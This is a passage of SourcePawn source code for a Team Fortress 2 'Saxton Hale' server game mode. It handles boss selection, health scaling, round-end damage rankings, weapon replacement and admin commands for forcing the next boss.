		tHale=FindNextHale(GetRandomInt(0,MaxClients-1));
	else
	{
		tHale=FindNextHale(Hale);
		if (bSkipNextHale)
		{
			tHale=FindNextHale(tHale);
			bSkipNextHale=false;
		}
	}
	if (NextHale<=0)
	{
		if (PrevHale<=0)
			Hale=tHale;
		else
		{
			Hale=PrevHale;
			PrevHale=-1;
		}
	}
	else
	{
		Hale=NextHale;
		PrevHale=tHale;
		NextHale=-1;
	}
	CreateTimer(9.5, StartHaleTimer);
	CreateTimer(3.5, StartResponceTimer);
	CreateTimer(9.6, MessageTimer,9001);	
	
	if (playing<=5)
		playing+=4;
	if ((playing>12) && (Special==2))
		playing-=(playing-12)/3;
	HaleHealthMax=RoundFloat(Pow(((320.0+(playing-1))*(playing-1)),1.14));
	if (HaleHealthMax==0)
		HaleHealthMax=1322;
	HaleHealth=HaleHealthMax;
	HaleRage=0;
	Stabbed=0.0;
	
	new ent=-1;
	decl Float:pos[3];
	while ((ent = FindEntityByClassname(ent, "func_regenerate")) != -1)
		AcceptEntityInput(ent, "Kill");
	ent=-1;
	decl ent2;
	while ((ent = FindEntityByClassname(ent, "item_ammopack_full")) != -1)
	{
		GetEntPropVector(ent, Prop_Send, "m_vecOrigin", pos); 
		AcceptEntityInput(ent, "Kill");
		ent2 = CreateEntityByName("item_ammopack_small");	
		TeleportEntity(ent2, pos, NULL_VECTOR, NULL_VECTOR);
		DispatchSpawn(ent2);	
	}
	ent=-1;
	while ((ent = FindEntityByClassname(ent, "item_ammopack_medium")) != -1)
	{
		GetEntPropVector(ent, Prop_Send, "m_vecOrigin", pos); 
		AcceptEntityInput(ent, "Kill");
		ent2 = CreateEntityByName("item_ammopack_small");	
		TeleportEntity(ent2, pos, NULL_VECTOR, NULL_VECTOR);
		DispatchSpawn(ent2);	
	}
	CreateTimer(0.2,Timer_GogoHale);
	used=0;	
	RoundState=0;
	return Plugin_Continue;
}

public Action:Timer_GogoHale(Handle:hTimer)
{
	RoundState=-1;
	CreateTimer(0.1,MakeHale);
}

public CheckArena()
{
	decl String:mapname[99];
	GetCurrentMap(mapname, sizeof(mapname));
	decl ent;
	tf_medieval=GetConVarInt(FindConVar("tf_medieval"))||StrEqual(mapname,"cp_degrootkeep");
	if (tf_medieval)
	{
		ent=-1;
		ent=FindEntityByClassname(ent, "tf_gamerules");
		while (ent!=-1)
		{
			SetVariantString("15");
			AcceptEntityInput(ent, "SetBlueTeamRespawnWaveTime");	
			SetVariantString("15");
			AcceptEntityInput(ent, "SetRedTeamRespawnWaveTime");	
			ent = FindEntityByClassname(ent, "tf_gamerules");
		}
		bArena=true;
	}
	else
	{
		ent=-1;
		ent = FindEntityByClassname(-1, "tf_logic_arena");
		if ((ent>0) && IsValidEdict(ent))
		{
			bArena=true;
			if (PointType)
			{
				decl String:s[8];
				IntToString(45+PointDelay*(playing-1),s,8);
				DispatchKeyValue(ent,"CapEnableDelay",s);
			}
			else
				DispatchKeyValue(ent,"CapEnableDelay","0");
		}
	}
}

public Action:event_round_end(Handle:event, const String:name[], bool:dontBroadcast)
{
	decl String:s[265];
	decl String:s2[265];
	new bool:see=false;

	GetNextMap(s, 64);
		
	if (!StrContains(s,"Hale ",false))
	{
		see=true;
		for (new i=0;(s[i]!=0) && (i<59);i++)
			s2[i]=s[i+5];
	}
	else if (!StrContains(s,"(Hale) ",false))
	{
		see=true;
		for (new i=0;(s[i]!=0) && (i<59);i++)
			s2[i]=s[i+7];
	}
	else if (!StrContains(s,"(Hale)",false))
	{
		see=true;
		for (new i=0;(s[i]!=0) && (i<59);i++)
			s2[i]=s[i+6];
	}
	if (see)
	{
		new Handle:fileh = OpenFile("bNextMapToHale", "w");
		WriteFileLine(fileh, s2,false);
		CloseHandle(fileh);
		SetNextMap(s2);
		CPrintToChatAll("%t","nextmap_hale",s2);
	}
	
	if (!Enabled)
		return Plugin_Continue;
			
	RoundState=2;	
	if ((GetEventInt(event, "team")==HaleTeam))
	{
		if (!Special)
		{
			Format(s,256,"../%s%i.mdl",HaleWin,GetRandomInt(1,2));
			EmitSoundToAll(s, _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, Hale, _, NULL_VECTOR, false, 0.0);
			EmitSoundToAll(s, _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, Hale, _, NULL_VECTOR, false, 0.0);
		}
		else if (Special==1)
		{
			Format(s,256,"../%s%i.mdl",VagineerKSpreeNew,GetRandomInt(1,5));
			EmitSoundToAll(s, _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, Hale, _, NULL_VECTOR, false, 0.0);
			EmitSoundToAll(s, _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, Hale, _, NULL_VECTOR, false, 0.0);
		}
	}
	
	//Statistics();
	CalcScores();
	
	RoundCount++;
	if (!bArena)	
		for(new i=1;i<=MaxClients;i++)
			if(IsValidEdict(i) && IsClientInGame(i) && !IsFakeClient(i))
				ChangeClientTeam(i, Team);	
	
	if (IsValidEdict(Hale) && IsClientInGame(Hale))
	{
		if (IsPlayerAlive(Hale))
		{
			GetClientName(Hale, s, 64);
			if (Special==1)
				Format(s,365,"%t","vagineer_is_alive",s,HaleHealth,HaleHealthMax);
			else if (Special==2)
				Format(s,365,"%t","hhh_is_alive",s,HaleHealth,HaleHealthMax);
			else
				Format(s,365,"%t","hale_is_alive",s,HaleHealth,HaleHealthMax);
			PrintToChatAll(s);
			SetHudTextParams(-1.0, 0.2, 10.0, 255, 255, 255, 255);
			for (new i = 1; i <= MaxClients; i++)
				if (IsValidEdict(i) && IsClientInGame(i))
					ShowHudText(i, -1, s);
		}
		new top[3];
		Damage[0]=0;
		for (new i=1;i<=MaxClients;i++)
		{
			if (Damage[i]>=Damage[top[0]])
			{
				top[2]=top[1];
				top[1]=top[0];
				top[0]=i;
			}
			else if (Damage[i]>=Damage[top[1]])
			{
				top[2]=top[1];
				top[1]=i;
			}
			else if (Damage[i]>=Damage[top[2]])
			{
				top[2]=i;
			}
		}
		if (Damage[0]>9000)
		{
			EmitSoundToAll("../models/player/saxton_hale/9000.mdl", _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, 1.0, 100, _, _, NULL_VECTOR, false, 0.0);
			EmitSoundToAll("../models/player/saxton_hale/9000.mdl", _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, 1.0, 100, _, _, NULL_VECTOR, false, 0.0);			
			EmitSoundToAll("../models/player/saxton_hale/9000.mdl", _, _, SNDLEVEL_TRAFFIC, SND_NOFLAGS, 1.0, 100, _, _, NULL_VECTOR, false, 0.0);
		}
		decl String:s1[80];
		new String:s3[512];		
		if (IsValidEdict(top[0]) && IsClientInGame(top[0]) && (GetClientTeam(top[0])>=1)) 
			GetClientName(top[0], s, 80);
		else
		{
			Format(s,80,"---");
			top[0]=0;
		}
		if (IsValidEdict(top[1]) && IsClientInGame(top[1]) && (GetClientTeam(top[1])>=1)) 
			GetClientName(top[1], s1, 80);
		else
		{
			Format(s1,80,"---");
			top[1]=0;
		}
		if (IsValidEdict(top[2]) && IsClientInGame(top[2]) && (GetClientTeam(top[2])>=1)) 
			GetClientName(top[2], s2, 80);
		else
		{
			Format(s2,80,"---");
			top[2]=0;
		}
		SetHudTextParams(-1.0, 0.3, 10.0, 255, 255, 255, 255);
		for (new i = 1; i <= MaxClients; i++)
			if (IsClientInGame(i))
			{
				Format(s3,512,"%t:\n1)%i - %s\n2)%i - %s\n3)%i - %s\n\n%t %i","top_3",Damage[top[0]],s,Damage[top[1]],s1,Damage[top[2]],s2,"damage_fx",Damage[i]);
				ShowHudText(i, -1, s3);
			}
	}		
	return Plugin_Continue;
}

CalcScores()
{
	for(new i=1;i<=MaxClients;i++)
		if(IsValidEdict(i) && IsClientInGame(i) && !IsFakeClient(i))
		{			
			new Handle:aevent = CreateEvent("player_escort_score", true) ;
			SetEventInt(aevent, "points", RoundFloat(Float:Damage[i]/400.0));
			FireEvent(aevent);
		}
}

public Action:StartResponceTimer(Handle:hTimer)
{
	decl String:s[256];
	decl Float:pos[3];
	switch (Special)
	{
		case 0: Format(s,256,"../%s%i.mdl",HaleRoundStart,GetRandomInt(1,5));
		case 1:
		{
			if (!GetRandomInt(0,1))
				Format(s,256,"../%s",VagineerStart);
			else
				Format(s,256,"../%s",VagineerRoundStart);
		}
		case 2: Format(s,256,"ui/halloween_boss_summoned_fx.wav");
	}		
	EmitSoundToAll(s, _, SNDCHAN_VOICE, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, Hale, pos, NULL_VECTOR, false, 0.0);
	EmitSoundToAll(s, _, SNDCHAN_ITEM, SNDLEVEL_TRAFFIC, SND_NOFLAGS, SNDVOL_NORMAL, 100, Hale, pos, NULL_VECTOR, false, 0.0);
	return Plugin_Continue;
}

public Action:StartHaleTimer(Handle:hTimer)
{
	CreateTimer(0.25, GottamTimer);
	if (!bArena)
		for (new i=1;i<=MaxClients;i++)
			if (IsValidEdict(i) && IsClientInGame(i) && !IsPlayerAlive(i))
				TF2_RespawnPlayer(i);	
	if (!IsClientInGame(Hale) || !IsPlayerAlive(Hale))
	{
		RoundState=2;
		return Plugin_Continue;		
	}	
	playing=0;
	for (new client=1;client<=MaxClients;client++)
	if (IsValidEdict(client) && IsClientInGame(client) && (client!=Hale) && IsPlayerAlive(client)) 
	{	
		bonplay[client]=true;
		playing++;		
		CreateTimer(0.15, MakeNoHale, GetClientUserId(client));
	}
	if (playing<=5)
		playing+=4;
	if ((playing>12) && (Special==2))
		playing-=(playing-12)/3;
	HaleHealthMax=RoundFloat(Pow(((320.0+(playing-1))*(playing-1)),1.14));
	if (HaleHealthMax==0)
		HaleHealthMax=1322;
	SetEntProp(Hale, Prop_Data, "m_iMaxHealth",HaleHealthMax);
	SetEntProp(Hale, Prop_Data, "m_iHealth",HaleHealthMax);
	ChangeEdictState(Hale, GetEntSendPropOffs(Hale, "m_iMaxHealth"));
	ChangeEdictState(Hale, GetEntSendPropOffs(Hale, "m_iHealth"));
	HaleHealth=HaleHealthMax;
	CreateTimer(0.2,CheckAlivePlayers);
	CreateTimer(0.2, HaleTimer,_, TIMER_REPEAT|TIMER_FLAG_NO_MAPCHANGE);
	CreateTimer(0.2, StartRound);
	CreateTimer(0.2, ClientTimer, _, TIMER_REPEAT|TIMER_FLAG_NO_MAPCHANGE);
	if (!PointType)
	{
		new CP=-1,CPm=-1;
		while ((CP = FindEntityByClassname(CP, "trigger_capture_area")) != -1)
		{
			if ((CP>0) && IsValidEdict(CP))
				AcceptEntityInput(CP, "Disable");	
		}
		while ((CPm = FindEntityByClassname(CPm, "team_control_point")) != -1)
		{
			if ((CPm>0) && IsValidEdict(CPm))
				AcceptEntityInput(CPm, "HideModel");	
		}
	}
	return Plugin_Continue;
}

public Action:GottamTimer(Handle:hTimer)
{
	for (new i=1;i<=MaxClients;i++)
		if (IsValidEdict(i) && IsClientInGame(i) && IsPlayerAlive(i))
			SetEntityMoveType(i, MOVETYPE_WALK);
}
	
public Action:StartRound(Handle:hTimer)
{
	RoundState=1;		
	if (IsValidEdict(Hale) && IsClientInGame(Hale) && (GetClientTeam(Hale)==HaleTeam) && ((GetPlayerWeaponSlot(Hale, 2)<=0) || !IsValidEdict(GetPlayerWeaponSlot(Hale, 2))))
		EquipSaxton(Hale);
	if (RoundCount>=2)
		CreateTimer(10.0,Timer_SkipHalePanel);
	return Plugin_Continue;
}

public Action:Timer_SkipHalePanel(Handle:hTimer)
{
	SkipHalePanel(FindNextHale(Hale),0);
}

public Action:EnableSG(Handle:hTimer,any:iid)
{	
	new i=EntRefToEntIndex(iid);
	if ((RoundState==1) && IsValidEdict(i) && (i>0))
	{
		decl String:s[64];
		GetEdictClassname(i, s, 64);
		if (StrEqual(s,"obj_sentrygun"))
		{
			SetEntProp(i, Prop_Send, "m_bDisabled", 0);
			
			for (new ent=MaxClients+1;ent<ME;ent++)
			if (IsValidEdict(ent))
			{
				new String:s2[64];
				GetEdictClassname(ent, s2, 64);
				if (StrEqual(s2,"info_particle_system") && (GetEntPropEnt(ent, Prop_Data, "m_hOwnerEntity")==i))
				{
					AcceptEntityInput(ent, "Kill");
					//RemoveEdict(ent);
				}
			}
		}
	}
	return Plugin_Continue;
}

public Action:RemoveEnt(Handle:timer, any:entid)
{
	new ent=EntRefToEntIndex(entid);
	if (IsValidEntity(ent) && (ent>0))
		AcceptEntityInput(ent, "Kill");
	return Plugin_Continue;
}

public Action:MessageTimer(Handle:hTimer,any:client)
{
	if (!IsValidEdict(Hale) || (Hale<=0) || !IsClientInGame(Hale) || ((client!=9001) && !IsClientInGame(client)))
		return Plugin_Continue;
	
	decl String:s[64];
	decl String:s9001[365];
	if (IsClientInGame(Hale))
		GetClientName(Hale, s, 64);
	if (Special==1)
	{
		Format(s9001,365,"%t","start_vagineer",s,HaleHealthMax);
		SetHudTextParams(-1.0, 0.4, 10.0, 255, 255, 255, 255);
		if (client!=9001)
			ShowHudText(client, -1, s9001);
		else
			for (new i = 1; i <= MaxClients; i++)
				if (IsClientInGame(i))
					ShowHudText(i, -1, s9001);
	}
	else if (Special==2)
	{
		Format(s9001,365,"%t","start_hhh",s,HaleHealthMax);
		SetHudTextParams(-1.0, 0.4, 10.0, 255, 255, 255, 255);
		if (client!=9001)
			ShowHudText(client, -1, s9001);
		else
			for (new i = 1; i <= MaxClients; i++)
				if (IsClientInGame(i))
					ShowHudText(i, -1, s9001);
	}
	else
	{
		Format(s9001,365,"%t","start_hale",s,HaleHealthMax);
		SetHudTextParams(-1.0, 0.4, 10.0, 255, 255, 255, 255);
		if (client!=9001)
			ShowHudText(client, -1, s9001);
		else
			for (new i = 1; i <= MaxClients; i++)
				if (IsClientInGame(i))
					ShowHudText(i, -1, s9001);
	}
	return Plugin_Continue;
}

public Action:MakeModelTimer(Handle:hTimer)
{		
	if (!IsValidEdict(Hale) || !IsClientInGame(Hale) || !IsPlayerAlive(Hale) || (RoundState==2))
	{
		KillTimer(hTimer);
		return Plugin_Continue;
	}	
	if (Special==0)
		SetVariantString(HaleModel);
	else if (Special==1)
	{
		SetVariantString(VagineerModel);
		SetEntProp(Hale, Prop_Send,"m_nSkin",GetClientTeam(Hale)-2);
	}
	else if (Special==2)
		SetVariantString(HHHModel);
	DispatchKeyValue(Hale, "targetname", "hale");	
	AcceptEntityInput(Hale, "SetCustomModel");
	SetEntProp(Hale, Prop_Send, "m_bUseClassAnimations",1);	
	SetEntProp(Hale, Prop_Send, "m_nBody", 0);
	return Plugin_Continue;
}

EquipSaxton(client)
{
	if (Special==1)
	{
		SetCommandFlags("r_screenoverlay", GetCommandFlags("r_screenoverlay") & (~FCVAR_CHEAT));
		ClientCommand(Hale, "r_screenoverlay \"%s\"", "");
		SetCommandFlags("r_screenoverlay", GetCommandFlags("r_screenoverlay") & FCVAR_CHEAT);
	}
	bEnableSuperDuperJump=false;
	new SaxtonWeapon=GetPlayerWeaponSlot(client, 2);
	TF2_RemoveAllWeapons(client);
	if (Special==0)
	{
		SaxtonWeapon = SpawnWeapon(client,"tf_weapon_shovel",6,101,5,"68 ; 2 ; 2 ; 3.0");
		//SaxtonWeapon = SDKCall(GiveNamedItem, client, "tf_weapon_shovel", 0,0);
		//SDKCall(WeaponEquip, client, SaxtonWeapon);
		SetEntityRenderMode(SaxtonWeapon, RENDER_TRANSCOLOR);
		SetEntityRenderColor(SaxtonWeapon, 255, 255, 255, 0);
		SetEntPropEnt(client, Prop_Send, "m_hActiveWeapon", SaxtonWeapon);
		HaleCharge=0;
	}
	else if (Special==2)
	{
		SaxtonWeapon = SpawnWeapon(client,"tf_weapon_sword",266,101,5,"68 ; 2 ; 2 ; 3.0");
		//SaxtonWeapon = SDKCall(GiveNamedItem, client, "tf_weapon_sword", 0,0);
		//SDKCall(WeaponEquip, client, SaxtonWeapon);
		SetEntPropEnt(client, Prop_Send, "m_hActiveWeapon", SaxtonWeapon);
		HaleCharge=-500;
	}
	else
	{
		SaxtonWeapon = SpawnWeapon(client,"tf_weapon_wrench",197,101,5,"68 ; 2 ; 2 ; 3.0");
		//SaxtonWeapon = SDKCall(GiveNamedItem, client, "tf_weapon_wrench", 0,0);
		//SDKCall(WeaponEquip, client, SaxtonWeapon);
		SetEntPropEnt(client, Prop_Send, "m_hActiveWeapon", GetPlayerWeaponSlot(client, 2));
		HaleCharge=0;
	}
}

public Action:MakeHale(Handle:hTimer)
{
	if (!IsValidEdict(Hale) || !IsClientInGame(Hale))
		return Plugin_Continue;
	if (Special==1)
		TF2_SetPlayerClass(Hale, TFClass_Engineer);
	else if (Special==2)
		TF2_SetPlayerClass(Hale, TFClass_DemoMan);
	else
		TF2_SetPlayerClass(Hale, TFClass_Soldier);
	ChangeClientTeam(Hale, HaleTeam);
	
	if (RoundState==0)
		return Plugin_Continue;
	
	CreateTimer(0.2, MakeModelTimer,_);
	CreateTimer(20.0, MakeModelTimer,_,TIMER_REPEAT|TIMER_FLAG_NO_MAPCHANGE);
	
	if (!IsPlayerAlive(Hale))
		return Plugin_Continue;
	
	if (!bArena && (RoundState<1))		
		SetEntityMoveType(Hale, MOVETYPE_NONE);
		
	new ent=-1;
	while ((ent = FindEntityByClassname(ent, "tf_wearable")) != INVALID_ENT_REFERENCE)
	{
		if (GetEntPropEnt(ent, Prop_Data, "m_hOwnerEntity")==Hale)
			AcceptEntityInput(ent, "kill");
	}	
	while ((ent = FindEntityByClassname(ent, "tf_wearable_demoshield")) != INVALID_ENT_REFERENCE)
	{
		if (GetEntPropEnt(ent, Prop_Data, "m_hOwnerEntity")==Hale)
			AcceptEntityInput(ent, "kill");
	}	

	EquipSaxton(Hale);
	HintPanel(Hale,0);
		
	return Plugin_Continue;
}

public Action:MakeNoHale(Handle:hTimer,any:clientid)
{
	new client=GetClientOfUserId(clientid);
	if ((client<=0) || !IsValidEdict(client) || !IsClientInGame(client) || (RoundState==2) || IsFakeClient(client))
		return Plugin_Continue;
		
	SetVariantString("");
	AcceptEntityInput(client, "SetCustomModel");
	if (!bArena && (RoundState<1))		
		SetEntityMoveType(client, MOVETYPE_NONE);
		
	if (bArena || (RoundState<1) || (HaleHealth==HaleHealthMax))
		ChangeClientTeam(client, Team);
	else if (bArena && (RoundState==1) && IsPlayerAlive(client))
		FakeClientCommand(client,"kill");
	else
		ChangeClientTeam(client, 1);

	if (!IsPlayerAlive(client))
		return Plugin_Continue;
	
	SetEntityRenderColor(client, 255, 255, 255, 255);	
	if (RoundState==0)
		HelpPanel2(client,0);
	
	decl String:mapname[99];
	GetCurrentMap(mapname, sizeof(mapname));
	if (tf_medieval)
		return Plugin_Continue;
	
	new weapon=GetPlayerWeaponSlot(client, 0);
	decl index;
	if (IsValidEdict(weapon) && (weapon>0))
	{
		index=GetEntProp(weapon, Prop_Send, "m_iItemDefinitionIndex");
		if (index==41)
		{
			TF2_RemoveWeaponSlot(client, 0);
			weapon = SpawnWeapon(client,"tf_weapon_minigun",15,0,6,"");
		}	
		else if (index==141)
		{
			TF2_RemoveWeaponSlot(client, 0);
			weapon = SpawnWeapon(client,"tf_weapon_shotgun_primary",9,1,6,"");
		}
		else if (index==237)
		{
			TF2_RemoveWeaponSlot(client, 0);
			weapon = SpawnWeapon(client,"tf_weapon_rocketlauncher",18,1,6,"");
			SetAmmo(client,0,20);
			SetEntProp(client, Prop_Data, "m_iHealth",200);
			ChangeEdictState(client, GetEntSendPropOffs(client, "m_iHealth"));
		}
		else if ((index==17) || (index==204) || (index==36))
		{
			TF2_RemoveWeaponSlot(client, 0);
			weapon = SpawnWeapon(client,"tf_weapon_syringegun_medic",36,1,10,"17 ; 0.05");
		}
	}
	weapon=GetPlayerWeaponSlot(client, 1);
	if (IsValidEdict(weapon) && (weapon>0))
	{
		index=GetEntProp(weapon, Prop_Send, "m_iItemDefinitionIndex");
		weapon=-5;		
		if (index==226)
		{
			TF2_RemoveWeaponSlot(client, 1);
			weapon = SpawnWeapon(client,"tf_weapon_shotgun_soldier",199,5,6,"");
		}
		else if ((index==57) || (index==58) || (index==231))
			TF2_RemoveWeaponSlot(client, 1);
		else if (index==265)
		{
			TF2_RemoveWeaponSlot(client, 1);
			weapon = SpawnWeapon(client,"tf_weapon_pipebomblauncher",207,1,6,"");
			SetAmmo(client,1,24);
			SetEntProp(client, Prop_Data, "m_iHealth",175);
			ChangeEdictState(client, GetEntSendPropOffs(client, "m_iHealth"));
		}
		else if ((index==29) || (index==211))
		{
			TF2_RemoveWeaponSlot(client, 1);
			weapon = SpawnWeapon(client,"tf_weapon_medigun",35,5,10,"18 ; 1 ; 10 ; 1.3");
			SetEntPropFloat(weapon, Prop_Send, "m_flChargeLevel",0.41);
		}
	}
	weapon=GetPlayerWeaponSlot(client, 2);
	if (IsValidEdict(weapon) && (weapon>0))
	{
		index=GetEntProp(weapon, Prop_Send, "m_iItemDefinitionIndex");
		if (index==38)
		{
			TF2_RemoveWeaponSlot(client,2);
			weapon = SpawnWeapon(client,"tf_weapon_fireaxe",192,1,6,"");
		}
		else if (index==331)
		{
			TF2_RemoveWeaponSlot(client,2);
			weapon = SpawnWeapon(client,"tf_weapon_fists",195,1,6,"");
		}
		else if (index==43)
		{
			TF2_RemoveWeaponSlot(client,2);
			weapon = SpawnWeapon(client,"tf_weapon_fists",239,1,6,"107 ; 1.3 ; 1 ; 0.5 ; 128 ; 1 ; 191 ; -6");
		}
		else if ((index==132) || (index==266))
		{
			TF2_RemoveWeaponSlot(client,2);
			weapon = SpawnWeapon(client,"tf_weapon_sword",327,1,6,"202 ; 0.5 ; 125 ; -15");
		}
		else if (index==357)
		{
			TF2_RemoveWeaponSlot(client,2);
			if (TF2_GetPlayerClass(client) == TFClass_DemoMan)
				weapon = SpawnWeapon(client,"tf_weapon_sword",327,1,6,"202 ; 0.5 ; 125 ; -15");
			else
				weapon = SpawnWeapon(client,"tf_weapon_shovel",128,1,6,"115 ; 1");
			
		}
		else if (index==355)
		{
			TF2_RemoveWeaponSlot(client, 2);
			weapon = SpawnWeapon(client,"tf_weapon_bat",190,1,6,"");
		}
	}
	weapon=GetPlayerWeaponSlot(client, 4);
	if (IsValidEdict(weapon) && (weapon>0) && (GetEntProp(weapon, Prop_Send, "m_iItemDefinitionIndex")==60))
	{
		TF2_RemoveWeaponSlot(client,4);
		weapon = SpawnWeapon(client,"tf_weapon_invis",212,1,6,"");
	}
	if (TF2_GetPlayerClass(client) == TFClass_Sniper)
		weapon = SpawnWeapon(client,"tf_weapon_smg",203,1,6,"");
	return Plugin_Continue;
}

public Action:event_changeclass(Handle:event, const String:name[], bool:dontBroadcast)
{
	if (!Enabled)
		return Plugin_Continue;
	new client=GetClientOfUserId(GetEventInt(event, "userid"));	
	
	for (new ionplay=1;ionplay<=MaxClients;ionplay++)
		if (IsValidEdict(ionplay) && IsClientInGame(ionplay) && (ionplay!=Hale) && (GetClientTeam(ionplay)==HaleTeam) && !IsFakeClient(ionplay)) 
			ChangeClientTeam(ionplay, Team);
	
	if ((client==Hale) && (TF2_GetPlayerClass(client)!=TFClass_Soldier) && (Special==0))
		TF2_SetPlayerClass(client, TFClass_Soldier);
	else if ((client==Hale) && (TF2_GetPlayerClass(client)!=TFClass_Engineer) && (Special==1))
		TF2_SetPlayerClass(client, TFClass_Engineer);
	else if ((client==Hale) && (TF2_GetPlayerClass(client)!=TFClass_DemoMan) && (Special==2))
		TF2_SetPlayerClass(client, TFClass_DemoMan);
	return Plugin_Continue;
}

public Action:event_lazor(Handle:event, const String:name[], bool:dontBroadcast)
{
	if (!Enabled)
		return Plugin_Continue;
	new client=GetClientOfUserId(GetEventInt(event, "userid"));
	decl String:s[64];
	if (IsValidEdict(client) && IsClientInGame(client) && IsPlayerAlive(client))
	{
		new medigun = GetPlayerWeaponSlot(client, 1);
		
		if (IsValidEdict(medigun) && (medigun > 0))
		{
			GetEdictClassname(medigun, s, sizeof(s));
			if (StrEqual(s,"tf_weapon_medigun"))
			{
				TF2_AddCondition(client,TFCond_Ubercharged,0.5);	
				SetEntPropFloat(medigun, Prop_Send, "m_flChargeLevel",1.51);			
				CreateTimer(0.4,Timer_Lazor,EntIndexToEntRef(medigun),TIMER_REPEAT|TIMER_FLAG_NO_MAPCHANGE);
			}
		}
	}	
	return Plugin_Continue;
}

public Action:Timer_Lazor(Handle:hTimer,any:medigunid)
{
	new medigun=EntRefToEntIndex(medigunid);
	if (IsValidEdict(medigun) && (medigun > 0) && (RoundState==1))
	{
		new client=GetEntPropEnt(medigun, Prop_Data, "m_hOwnerEntity");		
		new weapon=GetEntPropEnt(client, Prop_Send, "m_hActiveWeapon");
		new Float:charge=GetEntPropFloat(medigun, Prop_Send, "m_flChargeLevel");
		if (weapon==medigun)
		{
			new target=GetHealingTarget(client);
			if (charge>0.05)
			{		
				TF2_AddCondition(client,TFCond_Ubercharged,0.5);		
				if ((target>0) && IsValidEdict(target))	
					TF2_AddCondition(target,TFCond_Ubercharged,0.5);	
			}
		}
		if (charge<=0.05)
		{
			CreateTimer(3.0,Timer_Lazor2,EntIndexToEntRef(medigun));
			KillTimer(hTimer);
		}
	}
	else
		KillTimer(hTimer);
	return Plugin_Continue;
}

public Action:Timer_Lazor2(Handle:hTimer,any:medigunid)
{
	new medigun=EntRefToEntIndex(medigunid);
	SetEntPropFloat(medigun, Prop_Send, "m_flChargeLevel",0.41);	
	return Plugin_Continue;
}

public Action:Command_GetHP(client, args)
{
	if (!Enabled || (RoundState!=1))
		return Plugin_Continue;	
	if (client==Hale)
	{
		if (Special==1)
			PrintCenterTextAll("%t","vagineer_show_hp",HaleHealth,HaleHealthMax);	
		else if (Special==2)
			PrintCenterTextAll("%t","hhh_show_hp",HaleHealth,HaleHealthMax);
		else
			PrintCenterTextAll("%t","hale_show_hp",HaleHealth,HaleHealthMax);	
	}
	else if ((used<3) && (RoundFloat(HPTime)<=0))
	{
		used++;
		if (Special==1)
		{
			PrintCenterTextAll("%t","vagineer_hp",HaleHealth,HaleHealthMax);	
			PrintToChatAll("%t","vagineer_hp",HaleHealth,HaleHealthMax);	
		}
		else if (Special==2)
		{
			PrintCenterTextAll("%t","hhh_hp",HaleHealth,HaleHealthMax);	
			PrintToChatAll("%t","hhh_hp",HaleHealth,HaleHealthMax);	
		}
		else
		{
			PrintCenterTextAll("%t","hale_hp",HaleHealth,HaleHealthMax);	
			PrintToChatAll("%t","hale_hp",HaleHealth,HaleHealthMax);	
		}
		HPTime=20.0;
	}
	else if (used>=3)
		PrintToChat(client, "%t","can_not_see_hp");	
	else
		PrintToChat(client, "%t","wait_hp",RoundFloat(HPTime));
	
	return Plugin_Continue;	
}

public Action:Command_Vagineer(client, args)
{
	Incoming=1;
	return Plugin_Continue;	
}


public Action:Command_HHH(client, args)
{
	Incoming=2;
	return Plugin_Continue;	
}


public Action:Command_NextHale(client, args)
{
	if (Enabled)
		CreateTimer(0.2, MessageTimer);	
	return Plugin_Continue;	
}

public Action:Command_Hale(client, args)
{
	if (!Enabled)
		return Plugin_Continue;	
	decl String:s[80];
	decl String:s2[80];
	decl String:targetname[256];
	GetCmdArg(1, targetname, sizeof(targetname));	
	GetCmdArg(2, s2, sizeof(s2));	
	if (StrContains(targetname,"@me",false)>=0)
		ForceHale(client,client,StrContains(s2,"hidden",false)>0);
	else
		for (new target=1;target<=MaxClients;target++)
			if(IsValidEdict(target) && IsClientInGame(target))		
			{
				GetClientName(target, s, 64);
				if (StrContains(s,targetname,false)>=0)	
				{
					ForceHale(client,target,StrContains(s2,"hidden",false)>=0);
					return Plugin_Continue;	
				}
			}		
	return Plugin_Continue;	
}

public Action:Command_Point_Disable(client, args)
{
	new CP=-1,CPm=-1;
	while ((CP = FindEntityByClassname(CP, "trigger_capture_area")) != -1)
	{
		if ((CP>0) && IsValidEdict(CP))
			AcceptEntityInput(CP, "Disable");	
	}
	while ((CPm = FindEntityByClassname(CPm, "team_control_point")) != -1)
	{
		if ((CPm>0) && IsValidEdict(CPm))
			AcceptEntityInput(CPm, "HideModel");	
	}
		
	return Plugin_Continue;	
}

public Action:Command_Point_Enable(client, args)
{
	new CP=-1,CPm=-1;
	while ((CP = FindEntityByClassname(CP, "trigger_capture_area")) != -1)
	{
		if ((CP>0) && IsValidEdict(CP))
			AcceptEntityInput(CP, "Enable");	
	}
	while ((CPm = FindEntityByClassname(CPm, "team_control_point")) != -1)
	{
		if ((CPm>0) && IsValidEdict(CPm))
			AcceptEntityInput(CPm, "ShowModel");	
	}
		
	return Plugin_Continue;	
}

public ForceHale(admin,client,bool:hidden)
{
	NextHale=client;
	bSkipNextHale=false;
	if (!hidden)
	{
		decl String:s1[64];
		GetClientName(client, s1, 64);
		PrintToChatAll("%s %t",s1,"hale_select_text");
	}
}

public OnClientPutInServer(client)
{
	if (Enabled)
	{
		bHelped[client]=false;
	}
}

public OnClientDisconnect(client)
{
	if ((Enabled) && (client==Hale))
	{
		ForceTeamWin(Team);
		new tHale=FindNextHale(Hale);
		if (IsClientInGame(tHale) && !IsFakeClient(tHale))
			ChangeClientTeam(tHale, HaleTeam);
	}	
}

public OnClientPostAdminCheck(client) 
{
	new AdminId:id = GetUserAdmin(client);
	if (id != INVALID_ADMIN_ID)
	{
		decl String:sd[8],String:sm[8];
		decl d,m;
		FormatTime(sd,8,"%d");
		d=StringToInt(sd);
		FormatTime(sm,8,"%m");
		m=StringToInt(sm);
		if (((d-last_update_day<2) && (d==last_update_month)) || ((m-last_update_month==1) && (last_update_day<2)))
			CreateTimer(10.0, AdminUpdateTimer, GetClientUserId(client));
	}
}

public Action:AdminUpdateTimer(Handle:hTimer,any:clientid)
{
	new client=GetClientOfUserId(clientid);
	if (IsClientInGame(client))
